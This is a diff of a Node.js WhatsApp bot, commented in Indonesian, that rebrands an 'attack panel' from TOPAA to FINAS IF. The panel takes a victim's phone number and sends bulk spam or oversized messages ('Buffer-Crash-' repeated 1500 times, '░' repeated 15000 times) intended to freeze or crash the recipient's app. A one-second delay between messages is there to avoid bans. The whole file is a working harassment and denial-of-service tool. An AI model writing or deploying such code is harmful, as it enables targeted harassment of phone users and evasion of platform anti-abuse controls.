@@ -5,11 +5,9 @@ const bodyParser = require('body-parser');
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
-
-// SETTINGAN PORT OTOMATIS RAILWAY
 const port = process.env.PORT || 3000;
 
-// MESIN ANTI-CRASH (KHUSUS SERVER CLOUD)
+// MESIN UTAMA
 const client = new Client({
     authStrategy: new LocalAuth(),
     puppeteer: { 
@@ -25,81 +23,78 @@ const client = new Client({
     }
 });
 
-// QR CODE AKAN MUNCUL DI TAB "LOGS" RAILWAY
 client.on('qr', (qr) => {
     console.log('SCAN QR INI DI LOGS RAILWAY:');
     qrcode.generate(qr, {small: true});
 });
 
 client.on('ready', () => {
-    console.log('✅ PANEL TOPAA SUDAH ONLINE!');
+    console.log('✅ FINAS IF PANEL ONLINE!');
 });
 
-// TAMPILAN PANEL DI BROWSER IPHONE
+// TAMPILAN DASHBOARD
 app.get('/', (req, res) => {
     res.send(`
         <html>
         <head>
-            <title>TOPAA PANEL V1</title>
+            <title>FINAS IF PANEL</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { background: #0a0a0a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-                .card { border: 2px solid #ff0055; background: #111; padding: 20px; border-radius: 15px; box-shadow: 0 0 15px #ff0055; max-width: 400px; margin: auto; }
-                h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; margin-bottom: 5px; }
-                p { font-size: 12px; color: #888; margin-bottom: 20px; }
-                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: white; font-size: 16px; }
-                button { background: #ff0055; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
-                button:hover { background: #ff0077; transform: scale(1.02); }
-                .footer { font-size: 10px; color: #444; margin-top: 20px; }
+                body { background: #000; color: #ffd700; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+                .card { border: 2px solid #ffd700; background: #111; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #ffd700; max-width: 400px; margin: auto; }
+                h1 { color: #ffd700; text-shadow: 0 0 10px #ffd700; font-size: 28px; margin-bottom: 5px; }
+                p { color: #888; font-size: 12px; }
+                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; font-size: 16px; }
+                button { background: #ffd700; color: #000; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
+                button:hover { background: #fff; transform: scale(1.05); }
+                .footer { margin-top: 20px; font-size: 10px; color: #555; }
             </style>
         </head>
         <body>
             <div class="card">
-                <h1>TOPAA PANEL</h1>
-                <p>STATUS: <span style="color: #00ff00;">CONNECTED</span></p>
+                <h1>FINAS IF PANEL</h1>
+                <p>OWNER: FINAS IF | STATUS: ONLINE</p>
                 <form action="/attack" method="POST">
                     <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                     <select name="type">
-                        <option value="spam">💥 FAST SPAM</option>
-                        <option value="freeze">☣️ UI FREEZE</option>
+                        <option value="spam">🔥 BRUTAL SPAM</option>
                         <option value="crash">💀 CRASH ANDROID</option>
+                        <option value="ui">☣️ UI FREEZE</option>
                     </select>
                     <input type="number" name="count" placeholder="Jumlah Pesan" value="10" required>
-                    <button type="submit">EXECUTE ATTACK</button>
+                    <button type="submit">START ATTACK</button>
                 </form>
-                <div class="footer">MADE BY TOPAA - 2026</div>
+                <div class="footer">POWERED BY FINAS IF - 2026</div>
             </div>
         </body>
         </html>
     `);
 });
 
-// PROSES PENGIRIMAN BUG
+// PROSES ATTACK
 app.post('/attack', async (req, res) => {
     const { number, type, count } = req.body;
     const chatId = number + "@c.us";
     
-    // NAMA SUDAH DIGANTI TOPAA
-    let text = "🔥 ATTACKED BY TOPAA 🔥"; 
+    // PESAN YANG DIKIRIM KE TARGET
+    let text = "🔥 SPAMMED BY FINAS IF 🔥"; 
 
-    if (type === "freeze") text = "░".repeat(10000);
-    if (type === "crash") text = "Buffer-Crash-".repeat(1000);
+    if (type === "crash") text = "Buffer-Crash-".repeat(1500);
+    if (type === "ui") text = "░".repeat(15000);
 
-    console.log(`[!] Menyerang: ${number} | Mode: ${type}`);
+    console.log(`[!] Target: ${number} | Mode: ${type}`);
 
     for (let i = 0; i < count; i++) {
         try {
             await client.sendMessage(chatId, text);
-            console.log(`[✔] Sent: ${i+1}`);
-            await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik biar gak gampang ke-ban
+            await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik biar aman
         } catch (e) {
             console.log("Error: " + e);
         }
     }
-    res.send('<h2>Serangan Selesai!</h2><a href="/" style="color:red;">KEMBALI KE PANEL</a>');
+    res.send('<h2 style="color:gold; text-align:center;">Serangan Finas IF Selesai!</h2><br><center><a href="/" style="color:white;">KEMBALI</a></center>');
 });
 
-// LISTENING SERVER
 app.listen(port, '0.0.0.0', () => {
     console.log('Server berjalan di port: ' + port);
 });
